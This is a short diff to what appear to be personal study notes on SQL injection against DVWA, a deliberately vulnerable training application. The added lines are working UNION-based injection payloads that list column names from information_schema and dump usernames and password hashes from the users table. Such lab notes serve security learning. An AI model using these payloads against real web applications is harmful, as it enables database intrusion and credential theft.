@@ -160,6 +160,10 @@ Spli  --input parameter is char
 		# to get schema name--table_schema from a particular schema 
 			id=1 union select table_name,2 from information_schema.tables where table_schema=database()#&Submit=Submit # ' will be interpreted by the server,
 			id=1 union select table_name,2 from information_schema.tables where table_schema=0x64767761#&Submit=Submit  # 0x dvwa
+		# to get the column_name
+			id=1 union select column_name,2 from information_schema.columns where table_schema=0x64767761 and table_name=0x7573657273#&Submit=Submit
+		# to get the content of a table
+			id=1 union select user,password from dvwa.users#&Submit=Submit
 			
 			
 	sqlmap
